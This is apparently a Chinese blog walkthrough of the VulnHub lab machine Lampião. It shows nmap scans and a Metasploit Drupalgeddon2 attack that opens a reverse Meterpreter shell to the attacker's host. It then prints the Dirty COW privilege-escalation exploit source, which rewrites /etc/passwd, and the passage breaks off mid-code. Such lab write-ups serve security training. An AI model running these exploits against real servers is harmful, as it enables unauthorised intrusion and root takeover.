<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>Lampiao.zip</p>
<ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9tZWdhLm56LyMhYUc0QUFhREIhQ0JMUlJZUXNBaFRPeVBKcXlqQzBCbHItd2VNSDlRTWRZYlBmTWowTEdlTQ==">https://mega.nz/#!aG4AAaDB!CBLRRYQsAhTOyPJqyjC0Blr-weMH9QMdYbPfMj0LGeM<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9sYW1waWFvL0xhbXBpYW8uemlw">https://download.vulnhub.com/lampiao/Lampiao.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9sYW1waWFvL0xhbXBpYW8uemlwLnRvcnJlbnQ=">https://download.vulnhub.com/lampiao/Lampiao.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>您想继续在自己的实验室中进行黑客入侵吗？<br>试试这个全新的脆弱机器！“Lampião1”。root它！</p>
<p>级别：简单</p>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.66.*</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.66.17</span><br><span class="line">Host is up (0.00024s latency).</span><br><span class="line">MAC Address: 00:0C:29:51:75:B7 (VMware)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -p- -v 192.168.66.17</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http?</span><br><span class="line">1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -p 22,80,1898 -v 192.168.66.17 --script=vuln</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp   open  http?</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   NULL: </span><br><span class="line">|     _____ _ _ </span><br><span class="line">|     |_|/ ___ ___ __ _ ___ _ _ </span><br><span class="line">|     \x20| __/ (_| __ \x20|_| |_ </span><br><span class="line">|     ___/ __| |___/ ___|__,_|___/__, ( ) </span><br><span class="line">|     |___/ </span><br><span class="line">|     ______ _ _ _ </span><br><span class="line">|     ___(_) | | | |</span><br><span class="line">|     \x20/ _` | / _ / _` | | | |/ _` | |</span><br><span class="line">|_    __,_|__,_|_| |_|</span><br><span class="line">|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">| http-csrf: </span></span><br><span class="line"><span class="string">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.66.17</span></span><br><span class="line"><span class="string">|   Found the following possible CSRF vulnerabilities: </span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.66.17:1898/</span></span><br><span class="line"><span class="string">|     Form id: user-login-form</span></span><br><span class="line"><span class="string">|     Form action: /?q=node&amp;destination=node</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.66.17:1898/?q=node/3</span></span><br><span class="line"><span class="string">|     Form id: user-login-form</span></span><br><span class="line"><span class="string">|     Form action: /?q=node/3&amp;destination=node/3</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.66.17:1898/?q=node/1</span></span><br><span class="line"><span class="string">|     Form id: user-login-form</span></span><br><span class="line"><span class="string">|     Form action: /?q=node/1&amp;destination=node/1</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.66.17:1898/?q=user/login&amp;amp;destination=node/3%23comment-form</span></span><br><span class="line"><span class="string">|     Form id: user-login</span></span><br><span class="line"><span class="string">|     Form action: /?q=user/login&amp;amp;destination=node/3%23comment-form</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.66.17:1898/?q=user/register&amp;amp;destination=node/1%23comment-form</span></span><br><span class="line"><span class="string">|     Form id: user-register-form</span></span><br><span class="line"><span class="string">|     Form action: /?q=user/register&amp;amp;destination=node/1%23comment-form</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.66.17:1898/?q=user/login&amp;amp;destination=node/1%23comment-form</span></span><br><span class="line"><span class="string">|     Form id: user-login</span></span><br><span class="line"><span class="string">|     Form action: /?q=user/login&amp;amp;destination=node/1%23comment-form</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.66.17:1898/?q=user/password</span></span><br><span class="line"><span class="string">|     Form id: user-pass</span></span><br><span class="line"><span class="string">|     Form action: /?q=user/password</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.66.17:1898/?q=node&amp;amp;destination=node</span></span><br><span class="line"><span class="string">|     Form id: user-login-form</span></span><br><span class="line"><span class="string">|     Form action: /?q=node&amp;destination=node%3Famp%253Bdestination%3Dnode</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.66.17:1898/?q=user/register&amp;amp;destination=node/3%23comment-form</span></span><br><span class="line"><span class="string">|     Form id: user-register-form</span></span><br><span class="line"><span class="string">|     Form action: /?q=user/register&amp;amp;destination=node/3%23comment-form</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.66.17:1898/?q=user/register</span></span><br><span class="line"><span class="string">|     Form id: user-register-form</span></span><br><span class="line"><span class="string">|     Form action: /?q=user/register</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.66.17:1898/?q=node/3&amp;amp;destination=node/3</span></span><br><span class="line"><span class="string">|     Form id: user-login-form</span></span><br><span class="line"><span class="string">|     Form action: /?q=node/3&amp;destination=node/3%3Famp%253Bdestination%3Dnode/3</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.66.17:1898/?q=node/1&amp;amp;destination=node/1</span></span><br><span class="line"><span class="string">|     Form id: user-login-form</span></span><br><span class="line"><span class="string">|     Form action: /?q=node/1&amp;destination=node/1%3Famp%253Bdestination%3Dnode/1</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.66.17:1898/?q=user/login&amp;amp;amp;destination=node/3%23comment-form</span></span><br><span class="line"><span class="string">|     Form id: user-login</span></span><br><span class="line"><span class="string">|_    Form action: /?q=user/login&amp;amp;amp;destination=node/3%23comment-form</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /robots.txt: Robots file</span><br><span class="line">|   /UPGRADE.txt: Drupal file</span><br><span class="line">|   /INSTALL.txt: Drupal file</span><br><span class="line">|   /INSTALL.mysql.txt: Drupal file</span><br><span class="line">|   /INSTALL.pgsql.txt: Drupal file</span><br><span class="line">|   /CHANGELOG.txt: Drupal v1</span><br><span class="line">|   /: Drupal version 7 </span><br><span class="line">|   /README.txt: Interesting, a readme.</span><br><span class="line">|   /includes/: Potentially interesting directory w/ listing on <span class="string">&#x27;apache/2.4.7 (ubuntu)&#x27;</span></span><br><span class="line">|   /misc/: Potentially interesting directory w/ listing on <span class="string">&#x27;apache/2.4.7 (ubuntu)&#x27;</span></span><br><span class="line">|   /modules/: Potentially interesting directory w/ listing on <span class="string">&#x27;apache/2.4.7 (ubuntu)&#x27;</span></span><br><span class="line">|   /scripts/: Potentially interesting directory w/ listing on <span class="string">&#x27;apache/2.4.7 (ubuntu)&#x27;</span></span><br><span class="line">|   /sites/: Potentially interesting directory w/ listing on <span class="string">&#x27;apache/2.4.7 (ubuntu)&#x27;</span></span><br><span class="line">|_  /themes/: Potentially interesting directory w/ listing on <span class="string">&#x27;apache/2.4.7 (ubuntu)&#x27;</span></span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server<span class="string">&#x27;s resources causing Denial Of Service.</span></span><br><span class="line"><span class="string">|       </span></span><br><span class="line"><span class="string">|     Disclosure date: 2009-09-17</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span></span><br><span class="line"><span class="string">|_      http://ha.ckers.org/slowloris/</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:apache:http_server:2.4.7: </span><br><span class="line">|       CVE-2020-1934   7.5     https://vulners.com/cve/CVE-2020-1934</span><br><span class="line">|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679</span><br><span class="line">|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312</span><br><span class="line">|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715</span><br><span class="line">|       CVE-2014-0226   6.8     https://vulners.com/cve/CVE-2014-0226</span><br><span class="line">|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788</span><br><span class="line">|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217</span><br><span class="line">|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927</span><br><span class="line">|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098</span><br><span class="line">|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220</span><br><span class="line">|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199</span><br><span class="line">|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798</span><br><span class="line">|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710</span><br><span class="line">|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743</span><br><span class="line">|       CVE-2016-2161   5.0     https://vulners.com/cve/CVE-2016-2161</span><br><span class="line">|       CVE-2016-0736   5.0     https://vulners.com/cve/CVE-2016-0736</span><br><span class="line">|       CVE-2014-3523   5.0     https://vulners.com/cve/CVE-2014-3523</span><br><span class="line">|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231</span><br><span class="line">|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092</span><br><span class="line">|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975</span><br><span class="line">|       CVE-2015-3185   4.3     https://vulners.com/cve/CVE-2015-3185</span><br><span class="line">|       CVE-2014-8109   4.3     https://vulners.com/cve/CVE-2014-8109</span><br><span class="line">|       CVE-2014-0118   4.3     https://vulners.com/cve/CVE-2014-0118</span><br><span class="line">|       CVE-2014-0117   4.3     https://vulners.com/cve/CVE-2014-0117</span><br><span class="line">|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283</span><br><span class="line">|_      CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612</span><br></pre></td></tr></table></figure>

<p>Nmap扫描显示端口22、80、1898已打开，因此考虑在浏览器中打开IP地址以及端口1898。它提供了有关运行了Drupal的网页的线索。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub240.jpg"></li>
</ul>
<p>根据先前的线索，考虑过使用漏洞利用drupal_drupalgeddon2进行利用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; search drupalgeddon2</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                      Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                      ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/webapp/drupal_drupalgeddon2):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting  Required  Description</span><br><span class="line">   ----         ---------------  --------  -----------</span><br><span class="line">   DUMP_OUTPUT  <span class="literal">false</span>            no        Dump payload <span class="built_in">command</span> output</span><br><span class="line">   PHP_FUNC     passthru         yes       PHP <span class="keyword">function</span> to execute</span><br><span class="line">   Proxies                       no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">   RPORT        80               yes       The target port (TCP)</span><br><span class="line">   SSL          <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI    /                yes       Path to Drupal install</span><br><span class="line">   VHOST                         no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic (PHP In-Memory)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="built_in">set</span> RHOSTS 192.168.66.17</span><br><span class="line">RHOSTS =&gt; 192.168.66.17</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="built_in">set</span> RPORT 1898</span><br><span class="line">RPORT =&gt; 1898</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.66.6:4444 </span><br><span class="line">[*] Sending stage (38288 bytes) to 192.168.66.17</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.66.6:4444 -&gt; 192.168.66.17:58696) at 2020-04-07 22:59:18 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line">meterpreter &gt; sessions 1</span><br><span class="line">[*] Session 1 is already interactive.</span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: /var/www/html</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line">Mode              Size     Type  Last modified              Name</span><br><span class="line">----              ----     ----  -------------              ----</span><br><span class="line">100755/rwxr-xr-x  110781   fil   2018-04-19 15:39:33 -0400  CHANGELOG.txt</span><br><span class="line">100755/rwxr-xr-x  1481     fil   2018-04-19 15:39:33 -0400  COPYRIGHT.txt</span><br><span class="line">100755/rwxr-xr-x  1717     fil   2018-04-19 15:39:33 -0400  INSTALL.mysql.txt</span><br><span class="line">100755/rwxr-xr-x  1874     fil   2018-04-19 15:39:33 -0400  INSTALL.pgsql.txt</span><br><span class="line">100755/rwxr-xr-x  1298     fil   2018-04-19 15:39:33 -0400  INSTALL.sqlite.txt</span><br><span class="line">100755/rwxr-xr-x  17995    fil   2018-04-19 15:39:33 -0400  INSTALL.txt</span><br><span class="line">100755/rwxr-xr-x  18092    fil   2018-04-19 15:39:33 -0400  LICENSE.txt</span><br><span class="line">100644/rw-r--r--  3427612  fil   2018-04-20 13:20:38 -0400  LuizGonzaga-LampiaoFalou.mp3</span><br><span class="line">100755/rwxr-xr-x  8710     fil   2018-04-19 15:39:33 -0400  MAINTAINERS.txt</span><br><span class="line">100755/rwxr-xr-x  5382     fil   2018-04-19 15:39:33 -0400  README.txt</span><br><span class="line">100755/rwxr-xr-x  10123    fil   2018-04-19 15:39:33 -0400  UPGRADE.txt</span><br><span class="line">100644/rw-r--r--  34715    fil   2018-04-20 13:09:26 -0400  audio.m4a</span><br><span class="line">100755/rwxr-xr-x  6604     fil   2018-04-19 15:39:33 -0400  authorize.php</span><br><span class="line">100755/rwxr-xr-x  720      fil   2018-04-19 15:39:33 -0400  cron.php</span><br><span class="line">40755/rwxr-xr-x   4096     dir   2018-04-19 15:39:33 -0400  includes</span><br><span class="line">100755/rwxr-xr-x  529      fil   2018-04-19 15:39:33 -0400  index.php</span><br><span class="line">100755/rwxr-xr-x  703      fil   2018-04-19 15:39:33 -0400  install.php</span><br><span class="line">100755/rwxr-xr-x  267732   fil   2015-08-03 22:51:40 -0400  lampiao.jpg</span><br><span class="line">40755/rwxr-xr-x   4096     dir   2018-04-19 15:39:33 -0400  misc</span><br><span class="line">40755/rwxr-xr-x   4096     dir   2018-04-19 15:39:33 -0400  modules</span><br><span class="line">40755/rwxr-xr-x   4096     dir   2018-04-19 15:39:33 -0400  profiles</span><br><span class="line">100644/rw-r--r--  9674     fil   2018-04-20 12:48:37 -0400  qrc.png</span><br><span class="line">100755/rwxr-xr-x  2189     fil   2018-04-19 15:39:33 -0400  robots.txt</span><br><span class="line">40755/rwxr-xr-x   4096     dir   2018-04-19 15:39:33 -0400  scripts</span><br><span class="line">40755/rwxr-xr-x   4096     dir   2018-04-19 15:39:33 -0400  sites</span><br><span class="line">40755/rwxr-xr-x   4096     dir   2018-04-19 15:39:33 -0400  themes</span><br><span class="line">100755/rwxr-xr-x  19986    fil   2018-04-19 15:39:33 -0400  update.php</span><br><span class="line">100755/rwxr-xr-x  2200     fil   2018-04-19 15:39:33 -0400  web.config</span><br><span class="line">100755/rwxr-xr-x  417      fil   2018-04-19 15:39:33 -0400  xmlrpc.php</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 4649 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/var/www/html</span><br></pre></td></tr></table></figure>

<p>现在已经有了meterpreter，因此考虑使用以下命令检查有关受害者机器的描述：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@lampiao:/var/www/html$ lsb_release -a</span><br><span class="line">lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 14.04.5 LTS</span><br><span class="line">Release:        14.04</span><br><span class="line">Codename:       trusty</span><br></pre></td></tr></table></figure>

<p>该说明从“受害者机器的版本号”中提供了非常有力的暗示，供下一步使用。</p>
<p>在使用较早的有关版本号的线索进行长时间搜索之后，终于找到了所需的漏洞，并将其下载到了计算机上。</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDA4NDc=">Linux内核2.6.22-3.9-Dirty-COW-/proc/self/mem-竞争条件提权-/etc/passwd方法<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>即脏牛提权</p>
<p>40847.cpp</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// EDB-Note: Compile:   g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line">// EDB-Note: Recommended way to run:   ./dcow -s    (Will automatically <span class="keyword">do</span> <span class="string">&quot;echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs&quot;</span>)</span><br><span class="line">//</span><br><span class="line">// -----------------------------------------------------------------</span><br><span class="line">// Copyright (C) 2016  Gabriele Bonacini</span><br><span class="line">//</span><br><span class="line">// This program is free software; you can redistribute it and/or modify</span><br><span class="line">// it under the terms of the GNU General Public License as published by</span><br><span class="line">// the Free Software Foundation; either version 3 of the License, or</span><br><span class="line">// (at your option) any later version.</span><br><span class="line">// This program is distributed <span class="keyword">in</span> the hope that it will be useful,</span><br><span class="line">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class="line">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span><br><span class="line">// GNU General Public License <span class="keyword">for</span> more details.</span><br><span class="line">// You should have received a copy of the GNU General Public License</span><br><span class="line">// along with this program; <span class="keyword">if</span> not, write to the Free Software Foundation,</span><br><span class="line">// Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301  USA</span><br><span class="line">// -----------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fstream&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string&gt;</span></span><br><span class="line"><span class="comment">#include &lt;thread&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mman.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;pwd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;pty.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;termios.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/wait.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;signal.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define  BUFFSIZE    1024</span></span><br><span class="line"><span class="comment">#define  PWDFILE     &quot;/etc/passwd&quot;</span></span><br><span class="line"><span class="comment">#define  BAKFILE     &quot;./.ssh_bak&quot;</span></span><br><span class="line"><span class="comment">#define  TMPBAKFILE  &quot;/tmp/.ssh_bak&quot;</span></span><br><span class="line"><span class="comment">#define  PSM         &quot;/proc/self/mem&quot;</span></span><br><span class="line"><span class="comment">#define  ROOTID      &quot;root:&quot;</span></span><br><span class="line"><span class="comment">#define  SSHDID      &quot;sshd:&quot;</span></span><br><span class="line"><span class="comment">#define  MAXITER     300</span></span><br><span class="line"><span class="comment">#define  DEFPWD      &quot;$6$P7xBAooQEZX/ham$9L7U0KJoihNgQakyfOQokDgQWLSTFZGB9LUU7T0W2kH1rtJXTzt9mG4qOoz9Njt.tIklLtLosiaeCBsZm8hND/&quot;</span></span><br><span class="line"><span class="comment">#define  TXTPWD      &quot;dirtyCowFun\n&quot;</span></span><br><span class="line"><span class="comment">#define  DISABLEWB   &quot;echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs\n&quot;</span></span><br><span class="line"><span class="comment">#define  EXITCMD     &quot;exit\n&quot;</span></span><br><span class="line"><span class="comment">#define  CPCMD       &quot;cp &quot;</span></span><br><span class="line"><span class="comment">#define  RMCMD       &quot;rm &quot;</span></span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">class Dcow&#123;</span><br><span class="line">    private:</span><br><span class="line">       bool              run,        rawMode,     opShell,   restPwd;</span><br><span class="line">       void              *map;</span><br><span class="line">       int               fd,         iter,        master,    wstat;</span><br><span class="line">       string            buffer,     etcPwd,      etcPwdBak,</span><br><span class="line">                         root,       user,        <span class="built_in">pwd</span>,       sshd;</span><br><span class="line">       thread            *writerThr, *madviseThr, *checkerThr;</span><br><span class="line">       ifstream          *extPwd;</span><br><span class="line">       ofstream          *extPwdBak;</span><br><span class="line">       struct passwd     *userId;</span><br><span class="line">       pid_t             child;  </span><br><span class="line">       char              buffv[BUFFSIZE];</span><br><span class="line">       fd_set            rfds;</span><br><span class="line">       struct termios    termOld,    termNew;</span><br><span class="line">       ssize_t           ign;</span><br><span class="line"></span><br><span class="line">       void exitOnError(string msg);</span><br><span class="line">    public:</span><br><span class="line">       Dcow(bool opSh, bool rstPwd);</span><br><span class="line">       ~Dcow(void);</span><br><span class="line">       int  expl(void);         </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Dcow::Dcow(bool opSh, bool rstPwd) : run(<span class="literal">true</span>), rawMode(<span class="literal">false</span>), opShell(opSh), restPwd(rstPwd),</span><br><span class="line">                   iter(0), wstat(0), root(ROOTID), <span class="built_in">pwd</span>(DEFPWD), sshd(SSHDID), writerThr(nullptr),</span><br><span class="line">                   madviseThr(nullptr), checkerThr(nullptr), extPwd(nullptr), extPwdBak(nullptr), </span><br><span class="line">                   child(0)&#123; </span><br><span class="line">   userId = getpwuid(getuid());</span><br><span class="line">   user.append(userId-&gt;pw_name).append(<span class="string">&quot;:&quot;</span>);</span><br><span class="line">   extPwd = new ifstream(PWDFILE);   </span><br><span class="line">   <span class="keyword">while</span> (getline(*extPwd, buffer))&#123;</span><br><span class="line">       buffer.append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">       etcPwdBak.append(buffer);</span><br><span class="line">       <span class="keyword">if</span>(buffer.find(root) == 0)&#123;</span><br><span class="line">          etcPwd.insert(0, root).insert(root.size(), <span class="built_in">pwd</span>);</span><br><span class="line">          etcPwd.insert(etcPwd.begin() + root.size() + pwd.size(), </span><br><span class="line">                        buffer.begin() + buffer.find(<span class="string">&quot;:&quot;</span>, root.size()), buffer.end());</span><br><span class="line">       &#125;<span class="keyword">else</span> <span class="keyword">if</span>(buffer.find(user) == 0 ||  buffer.find(sshd) == 0 )&#123;</span><br><span class="line">          etcPwd.insert(0, buffer);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          etcPwd.append(buffer);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   extPwdBak = new ofstream(restPwd ? TMPBAKFILE : BAKFILE);</span><br><span class="line">   extPwdBak-&gt;write(etcPwdBak.c_str(), etcPwdBak.size());</span><br><span class="line">   extPwdBak-&gt;close();</span><br><span class="line">   fd = open(PWDFILE,O_RDONLY);</span><br><span class="line">   map = mmap(nullptr, etcPwdBak.size(), PROT_READ,MAP_PRIVATE, fd, 0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Dcow::~Dcow(void)&#123;</span><br><span class="line">   extPwd-&gt;close();</span><br><span class="line">   close(fd);</span><br><span class="line">   delete extPwd; delete extPwdBak; delete madviseThr; delete writerThr; delete checkerThr;</span><br><span class="line">   <span class="keyword">if</span>(rawMode)    tcsetattr(STDIN_FILENO, TCSANOW, &amp;termOld);</span><br><span class="line">   <span class="keyword">if</span>(child != 0) <span class="built_in">wait</span>(&amp;wstat); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void Dcow::exitOnError(string msg)&#123;</span><br><span class="line">      cerr &lt;&lt; msg &lt;&lt; endl;</span><br><span class="line">      // <span class="keyword">if</span>(child != 0) <span class="built_in">kill</span>(child, SIGKILL);</span><br><span class="line">      throw new exception();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int  Dcow::expl(void)&#123;</span><br><span class="line">   madviseThr = new thread([&amp;]()&#123; <span class="keyword">while</span>(run)&#123; madvise(map, etcPwdBak.size(), MADV_DONTNEED);&#125; &#125;);</span><br><span class="line">   writerThr  = new thread([&amp;]()&#123; int fpsm = open(PSM,O_RDWR);  </span><br><span class="line">                                  <span class="keyword">while</span>(run)&#123; lseek(fpsm, reinterpret_cast&lt;off_t&gt;(map), SEEK_SET); </span><br><span class="line">                                              ign = write(fpsm, etcPwd.c_str(), etcPwdBak.size()); &#125;</span><br><span class="line">                                &#125;);</span><br><span class="line">   checkerThr = new thread([&amp;]()&#123; <span class="keyword">while</span>(iter &lt;= MAXITER)&#123; </span><br><span class="line">                                         extPwd-&gt;clear(); extPwd-&gt;seekg(0, ios::beg); </span><br><span class="line">                                         buffer.assign(istreambuf_iterator&lt;char&gt;(*extPwd),</span><br><span class="line">                                                       istreambuf_iterator&lt;char&gt;());</span><br><span class="line">                                         <span class="keyword">if</span>(buffer.find(<span class="built_in">pwd</span>) != string::npos &amp;&amp; </span><br><span class="line">                                            buffer.size() &gt;= 